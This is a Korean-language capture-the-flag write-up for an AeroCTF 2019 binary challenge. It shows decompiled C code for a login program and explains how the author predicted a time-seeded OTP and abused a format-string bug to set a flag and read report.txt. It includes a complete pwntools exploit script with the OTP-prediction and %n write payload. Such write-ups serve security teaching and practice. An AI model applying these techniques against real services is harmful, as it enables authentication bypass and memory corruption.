---
title: Aeroctf Writeup
date: 2019-03-11
---

# Navigation System

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+0h] [ebp-48h]
  unsigned int v5; // [esp+4h] [ebp-44h]
  char s1[4]; // [esp+8h] [ebp-40h]
  char v7[4]; // [esp+18h] [ebp-30h]
  unsigned int v8; // [esp+3Ch] [ebp-Ch]
  int *v9; // [esp+40h] [ebp-8h]

  v9 = &argc;
  v8 = __readgsdword(0x14u);
  wlc_msg();
  __isoc99_scanf("%16s", &s1[2]);
  printf("Password: ");
  fflush(stdout);
  __isoc99_scanf("%32s", &v7[3]);
  if ( strcmp(&s1[2], valid_login) )
  {
    puts("Username is invalid!");
    exit(-1);
  }
  if ( strcmp(&v7[3], valid_password) )
  {
    puts("Passowrd is invalid!");
    exit(-2);
  }
  v5 = genOTPcode(&s1[2], &v7[3]);
  printf("Enter the OTP code: ");
  fflush(stdout);
  __isoc99_scanf("%d", &v4);
  if ( v5 == v4 )
    UserPanel((int)&s1[2]);
  puts("OTP is incorrect!");
  fflush(stdout);
  return -1;
}
```

id, pw는 하드코딩되어 있어 바로 가능한데 OTP 코드가 문제다.

```c
unsigned int __cdecl genOTPcode(char *a1, char *a2)
{
  time_t v2; // eax
  unsigned int v3; // eax

  v2 = time(0);
  srand(*a2 + *a1 + v2);
  v3 = rand();
  return v3 + (v3 >= 0xFFFFFFFF);
}
```

time 기반으로 랜드 생성이라 시드를 맞출 수 있다. *a2 , *a1 = 't' 이다.(id,pw 의 첫 바이트를 가져온다)

대회 때는 못 풀었고 하다가 다른 ctf로 넘어갔는데 다 지나고나서 시드를 다시 맞춰봤다  OTP만  넘어가게되면

```c
void __cdecl __noreturn UserPanel(int a1)
{
  int v1; // [esp+Ch] [ebp-Ch]

  puts("-------------------- User menu --------------------");
  printf("Hello, %s\n", a1);
  fflush(stdout);
  while ( 1 )
  {
    while ( 1 )
    {
      puts("[1] Read latest report");
      puts("[2] Set a station");
      puts("[3] TODO");
      puts("[4] Exit");
      printf("> ");
      fflush(stdout);
      v1 = 4;
      __isoc99_scanf("%d", &v1);
      if ( v1 != 2 )
        break;
      setStation();
    }
    if ( v1 > 2 )
      break;
    if ( v1 != 1 )
      goto LABEL_13;
    readLastReport();
  }
  if ( v1 == 3 )
    UserExit();
  if ( v1 == 4 )
    UserExit();
LABEL_13:
  UserExit();
}
```

요 메뉴로 넘어가고

```c
unsigned int setStation()
{
  char buf[32]; // [esp+Ch] [ebp-2Ch]
  unsigned int v2; // [esp+2Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  printf("Set station > ");
  fflush(stdout);
  buf[read(0, buf, 0x20u)] = 0;
  printf("Station: ");
  printf(buf);
  putchar(10);
  return __readgsdword(0x14u) ^ v2;
}
```

요기의 포맷스트링을 이용해서

```c
int readLastReport()
{
  if ( flag )
    system("/bin/cat report.txt");
  else
    printf("[-] Access denied!");
  return putchar(10);
}
```

report.txt를 읽을 수 있다. 

```python
from pwn import *
from ctypes import *
import time
from datetime import datetime

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

t = remote('185.66.87.233', 5002)

#timestamp = time.mktime(datetime.today().timetuple())
#b = int(float(timestamp))

r("Login:")
s("test_account")
r("Password:")
s("test_password")
r("Enter the OTP code:")

libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
b = libc.time(0)
log.success("time ==> " + hex(b))
libc.srand(0x74*2 + b)
a = libc.rand()
log.success("rand ==> " + hex(a))

s(a)

r(">")
s("2")
r(">")
s(p32(0x0804C058) + "%7$n")
r(">")
s("1")

t.interactive()
```

서버가 너무 느려서 바로 보내기 직전에 time을 돌려줘야 하는 듯 ㅋㅋㅋㅋ (계속 안맞았었다 ㅠㅠ) report.txt가 flag여서 금방 끝 (rand 맞추는게 의도 였던 것 같다!)

```python
libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
b = libc.time(0)
libc.srand(0x74*2 + b)
a = libc.rand()
```

이게 time based srand 맞추기가 참 좋은듯 하다.(앞으로 이거 써야지) 

사실 시드 맞추는 데 여러 뻘짓이 있었는데.. OTP 입력하는 scanf가 %d였는데 %s인줄 알고 계속 팩해서 보냈어서 안맞았던 거였다 ㅠ.. 그래도 여러 방법으로 해봤으니 언젠간 쓸일이 있겠지!

